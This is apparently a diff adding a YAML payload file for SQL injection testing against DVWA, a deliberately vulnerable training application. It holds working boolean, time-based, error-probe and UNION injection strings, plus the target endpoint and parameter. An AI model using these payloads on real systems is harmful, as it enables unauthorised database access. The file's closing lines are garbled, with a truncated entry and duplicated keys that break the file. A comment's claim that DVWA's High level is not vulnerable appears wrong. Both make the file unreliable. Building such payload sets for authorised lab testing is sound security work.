@@ -1,0 +1,71 @@
+# DVWA SQL Injection Test Payloads
+# AUTHORIZED TESTING ONLY - For DVWA Testing Environment
+# These payloads are designed for the Damn Vulnerable Web Application (DVWA)
+
+# ==============================================================================
+# BOOLEAN-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# TRUE Condition - Should return results
+boolean_true_payload: "1' OR '1'='1"
+
+# FALSE Condition - Should return no results or different response
+boolean_false_payload: "1' OR '1'='2"
+
+# ==============================================================================
+# TIME-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# 3 second delay for MySQL (DVWA uses MySQL)
+time_delay_payload: "1' OR SLEEP(3)-- "
+
+# ==============================================================================
+# ERROR-BASED SQL INJECTION
+# ==============================================================================
+
+# Basic error probe
+error_probe_payload: "'"
+
+# ==============================================================================
+# UNION-BASED SQL INJECTION
+# ==============================================================================
+
+# DVWA typically has 2 columns in the vulnerable query
+union_payloads:
+  - "1' UNION SELECT NULL,NULL-- "
+  - "1' UNION SELECT user(),database()-- "
+  - "1' UNION SELECT version(),@@hostname-- "
+
+# ==============================================================================
+# OUT-OF-BAND (Placeholder - requires external server)
+# ==============================================================================
+
+oob_dns_payload: "OOB_DNS_PLACEHOLDER"
+oob_http_payload: "OOB_HTTP_PLACEHOLDER"
+
+# ==============================================================================
+# DVWA-SPECIFIC NOTES
+# ==============================================================================
+
+# DVWA SQL Injection Endpoint: /vulnerabilities/sqli/
+# Parameter: id
+# Method: GET
+# Default vulnerable query: SELECT first_name, last_name FROM users WHERE user_id = '$id';
+
+# Security Levels:
+# - Low: No protection
+# - Medium: Uses mysql_real_escape_string() but still vulnerable
+# - High: Uses prepared statements (not vulnerable)
+# - Impossible: Properly secured
+
+# Example URLs for manual testing:
+# Low: ?id=1' OR '1'='1
+# Medium: ?id=1 OR 1=1
+# High/Impossible: Not vulnerable
+boolean_true_payload: "1' OR
+boolean_true_payload: "1' OR '1'='1"
+boolean_false_payload: "1' OR '1'='2"
+time_delay_payload: "1' OR SLEEP(3)-- "
+error_probe_payload: "'"
+oob_dns_payload: "OOB_PLACEHOLDER"
+oob_http_payload: "OOB_PLACEHOLDER"
